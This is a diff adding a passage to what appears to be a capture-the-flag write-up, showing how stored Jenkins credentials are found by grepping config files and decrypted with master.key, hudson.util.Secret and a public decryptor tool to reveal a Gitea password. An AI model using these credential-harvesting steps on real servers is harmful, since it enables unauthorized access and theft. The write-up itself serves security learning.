@@ -295,3 +295,172 @@ drwxr-xr-x root root  92 B  Thu May  2 15:25:24 2024  workspace
 <br />
 
 The structure of the directory is the typical of a Jenkins server in Linux.
+
+After a time saerching for interesting information in this directory, a recursive grep revealed relevant data:
+
+<br />
+
+```bash
+❯ grep -ri "<password>"
+jobs/build/config.xml:              <password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>
+```
+
+<br />
+
+This seems to be an encrypted password, to further analyze we dump the content of this `config.xml` file:
+
+<br />
+
+```bash
+❯ /usr/bin/cat jobs/build/config.xml
+<?xml version='1.1' encoding='UTF-8'?>
+<jenkins.branch.OrganizationFolder plugin="branch-api@2.1163.va_f1064e4a_a_f3">
+  <actions/>
+  <description>dev</description>
+  <displayName>dev</displayName>
+  <properties>
+    <jenkins.branch.OrganizationChildHealthMetricsProperty>
+      <templates>
+        <com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
+          <nonRecursive>false</nonRecursive>
+        </com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric>
+      </templates>
+    </jenkins.branch.OrganizationChildHealthMetricsProperty>
+    <jenkins.branch.OrganizationChildOrphanedItemsProperty>
+      <strategy class="jenkins.branch.OrganizationChildOrphanedItemsProperty$Inherit"/>
+    </jenkins.branch.OrganizationChildOrphanedItemsProperty>
+    <jenkins.branch.OrganizationChildTriggersProperty>
+      <templates>
+        <com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
+          <spec>H H/4 * * *</spec>
+          <interval>86400000</interval>
+        </com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>
+      </templates>
+    </jenkins.branch.OrganizationChildTriggersProperty>
+    <com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
+      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
+        <entry>
+          <com.cloudbees.plugins.credentials.domains.Domain plugin="credentials@1337.v60b_d7b_c7b_c9f">
+            <specifications/>
+          </com.cloudbees.plugins.credentials.domains.Domain>
+          <java.util.concurrent.CopyOnWriteArrayList>
+            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl plugin="credentials@1337.v60b_d7b_c7b_c9f">
+              <id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>
+              <description></description>
+              <username>buildadm</username>
+              <password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>
+              <usernameSecret>false</usernameSecret>
+            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+          </java.util.concurrent.CopyOnWriteArrayList>
+        </entry>
+      </domainCredentialsMap>
+    </com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty>
+    <jenkins.branch.NoTriggerOrganizationFolderProperty>
+      <branches>.*</branches>
+      <strategy>NONE</strategy>
+    </jenkins.branch.NoTriggerOrganizationFolderProperty>
+  </properties>
+  <folderViews class="jenkins.branch.OrganizationFolderViewHolder">
+    <owner reference="../.."/>
+  </folderViews>
+  <healthMetrics/>
+  <icon class="jenkins.branch.MetadataActionFolderIcon">
+    <owner class="jenkins.branch.OrganizationFolder" reference="../.."/>
+  </icon>
+  <orphanedItemStrategy class="com.cloudbees.hudson.plugins.folder.computed.DefaultOrphanedItemStrategy" plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
+    <pruneDeadBranches>true</pruneDeadBranches>
+    <daysToKeep>-1</daysToKeep>
+    <numToKeep>-1</numToKeep>
+    <abortBuilds>false</abortBuilds>
+  </orphanedItemStrategy>
+  <triggers>
+    <com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
+      <spec>* * * * *</spec>
+      <interval>60000</interval>
+    </com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>
+  </triggers>
+  <disabled>false</disabled>
+  <navigators>
+    <org.jenkinsci.plugin.gitea.GiteaSCMNavigator plugin="gitea@1.4.7">
+      <serverUrl>http://172.18.0.2:3000</serverUrl>
+      <repoOwner>buildadm</repoOwner>
+      <credentialsId>e4048737-7acd-46fd-86ef-a3db45683d4f</credentialsId>
+      <traits>
+        <org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>
+          <strategyId>1</strategyId>
+        </org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>
+        <org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>
+          <strategyId>1</strategyId>
+        </org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>
+        <org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>
+          <strategyId>1</strategyId>
+          <trust class="org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait$TrustContributors"/>
+        </org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>
+      </traits>
+    </org.jenkinsci.plugin.gitea.GiteaSCMNavigator>
+  </navigators>
+  <projectFactories>
+    <org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory plugin="workflow-multibranch@773.vc4fe1378f1d5">
+      <scriptPath>Jenkinsfile</scriptPath>
+    </org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory>
+  </projectFactories>
+  <buildStrategies/>
+  <strategy class="jenkins.branch.DefaultBranchPropertyStrategy">
+    <properties class="empty-list"/>
+  </strategy>
+</jenkins.branch.OrganizationFolder>
+```
+
+<br />
+
+As we can see, the file contains more than an encrypted password. We noticed too that this password is the authentication for the `Gitea` instance of the `buildadm` user.
+
+<br />
+
+```bash
+ <org.jenkinsci.plugin.gitea.GiteaSCMNavigator plugin="gitea@1.4.7">
+      <serverUrl>http://172.18.0.2:3000</serverUrl>
+      <repoOwner>buildadm</repoOwner>
+      <credentialsId>e4048737-7acd-46fd-86ef-a3db45683d4f</credentialsId>
+      <traits>
+```
+
+<br />
+
+## Password decrypt
+
+<br />
+
+This type of passwords can be easily decrypted. However, to do this we need to access the `master.key` and `hudson.util.Secret` Jenkins secrets.
+
+Fortunately for us, these files are present under the `/secrets` folder:
+
+<br />
+
+```bash
+❯ ls -l secrets/master.key
+.rw-r--r-- root root 256 B Wed May  1 15:46:11 2024  secrets/master.key
+❯ ls -l secrets/hudson.util.Secret
+.rw-r--r-- root root 272 B Wed May  1 19:51:20 2024  secrets/hudson.util.Secret
+```
+
+<br />
+
+To decrypt the password we will use the following [GitHub repository](https://github.com/hoto/jenkins-credentials-decryptor).
+
+The program execution is really straightforward:
+
+<br />
+
+```bash
+❯ ./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
+[
+  {
+    "id": "e4048737-7acd-46fd-86ef-a3db45683d4f",
+    "password": "Git1234!",
+    "username": "buildadm"
+  }
+]
+```
+
+<br />
